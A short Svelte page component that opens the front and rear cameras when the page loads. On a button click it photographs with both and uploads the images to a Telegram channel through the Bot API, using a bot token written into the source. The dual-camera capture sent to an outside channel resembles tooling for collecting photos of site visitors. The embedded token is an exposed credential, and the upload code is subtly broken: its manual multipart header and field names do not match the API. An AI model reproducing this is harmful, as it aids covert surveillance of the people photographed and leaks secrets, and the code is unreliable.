
<script>
  import { onMount } from 'svelte';

  let rearCameraStream, frontCameraStream;
  let rearCameraTrack, frontCameraTrack;
  let rearCameraImageCapture, frontCameraImageCapture;
  let rearPhotoBlob, frontPhotoBlob;
  const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
  const telegramChannelUsername = '@localipy';

  onMount(async () => {
    try {
      rearCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      rearCameraTrack = rearCameraStream.getVideoTracks()[0];
      frontCameraTrack = frontCameraStream.getVideoTracks()[0];
      rearCameraImageCapture = new ImageCapture(rearCameraTrack);
      frontCameraImageCapture = new ImageCapture(frontCameraTrack);
    } catch (error) {
      console.error('Camera access denied or error occurred:', error);
    }
  });

  async function captureAndSendPhotos() {
    rearPhotoBlob = await rearCameraImageCapture.takePhoto();
    frontPhotoBlob = await frontCameraImageCapture.takePhoto();
    const formData = new FormData();
    formData.append('rearPhoto', rearPhotoBlob);
    formData.append('frontPhoto', frontPhotoBlob);
    await fetch(`https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto?chat_id=${telegramChannelUsername}`, {
      method: 'POST',
      body: formData,
      headers: {
        'Content-Type': 'multipart/form-data',
      },
    });
  }

  function stopCameraStreams() {
    rearCameraStream.getTracks().forEach((track) => track.stop());
    frontCameraStream.getTracks().forEach((track) => track.stop());
    rearCameraTrack.stop();
    frontCameraTrack.stop();
  }
</script>

<main>
  <button on:click={captureAndSendPhotos}>Capture and Send Photos</button>
  <button on:click={stopCameraStreams}>Stop Camera Streams</button>
</main>
